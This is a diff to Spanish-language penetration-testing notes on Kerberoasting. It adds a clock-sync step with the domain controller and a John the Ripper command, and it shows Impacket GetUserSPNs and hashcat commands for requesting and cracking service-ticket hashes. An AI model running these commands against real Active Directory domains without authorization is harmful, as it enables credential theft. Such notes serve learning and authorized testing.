@@ -23,6 +23,12 @@ GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicament
 
 ## Obtener Hash con Impacket-GetUsersSPNs
 
+```bash
+# Sincronizar el reloj con el DC
+❯ sudo timedatectl set-ntp off 
+❯ sudo ntpdate -u IP_DC
+```
+
 ```bash 
 ❯ impacket-GetUserSPNs domain.corp/user:'P@$$w0rd123!'    # Mirar si el usuario es Kerberosteable y listar los usuarios a los que se le puede solicitar un TGS
 
@@ -45,6 +51,9 @@ Notas:
 ## Crackear el Hash obtenido 
 
 ```bash 
+# john
+❯ john --format=krb5tgs kerb.txt -w=/usr/share/wordlists/rockyou.txt 
+
 # Guardar y crackear el hash con 'Hashcat'
 ❯ hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt --force
 ❯ hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force 
